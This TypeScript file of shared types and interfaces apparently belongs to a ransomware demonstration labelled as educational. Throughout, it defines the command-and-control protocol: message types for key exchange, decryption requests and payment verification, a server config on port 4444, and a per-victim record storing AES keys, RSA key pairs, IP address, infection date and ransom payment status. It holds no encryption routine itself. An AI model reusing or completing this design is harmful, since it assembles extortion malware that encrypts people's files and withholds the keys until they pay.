// Shared types and interfaces for client-server communication
// For educational purposes only

// Message types for client-server communication
export enum MessageType {
    INITIALIZE = 'INITIALIZE',
    STORE_IV = 'STORE_IV',
    ENCRYPT_KEY = 'ENCRYPT_KEY',
    DECRYPT_REQUEST = 'DECRYPT_REQUEST',
    PAYMENT_VERIFICATION = 'PAYMENT_VERIFICATION',
    STORE_ENCRYPTION_RESULTS = 'STORE_ENCRYPTION_RESULTS',
    LOAD_ENCRYPTION_RESULTS = 'LOAD_ENCRYPTION_RESULTS'
}

// Interface for messages exchanged between client and server
export interface ServerMessage {
    type: string
    victimId?: string
    publicKey?: string
    aesKey?: string // Base64 encoded
    encryptedAESKey?: string // Base64 encoded
    privateKey?: string
    success?: boolean
    message?: string
    iv?: string // Base64 encoded
    filePath?: string
    encryptionResults?: string // Base64 encoded serialized encryption results
    targetDirectory?: string
}

// Interface for storing victim information on the server
export interface VictimInfo {
    victimId: string
    aesKey: Buffer
    encryptedAESKey: Buffer
    publicKey: string
    privateKey: string
    infected: Date
    ipAddress: string
    paymentStatus: 'pending' | 'paid'
    ivMap: Map<string, Buffer> // Maps file paths to their IVs
    encryptionResults?: any // Store the complete encryption results
    targetDirectory?: string // Store the target directory path
}

// Server configuration constants
export const SERVER_CONFIG = {
    PORT: 4444,
    HOST: '127.0.0.1', // localhost - only for demonstration
    RESULTS_DIR: './results'
} as const

// Payment status enum
export enum PaymentStatus {
    PENDING = 'pending',
    PAID = 'paid',
    FAILED = 'failed'
}

// Response types for better type safety
export interface InitializeResponse extends ServerMessage {
    type: 'INITIALIZE_RESPONSE'
    victimId: string
    aesKey: string
    publicKey: string
}

export interface ErrorResponse extends ServerMessage {
    type: 'ERROR'
    message: string
}

export interface SuccessResponse extends ServerMessage {
    type: 'SUCCESS'
    success: true
    message?: string
}
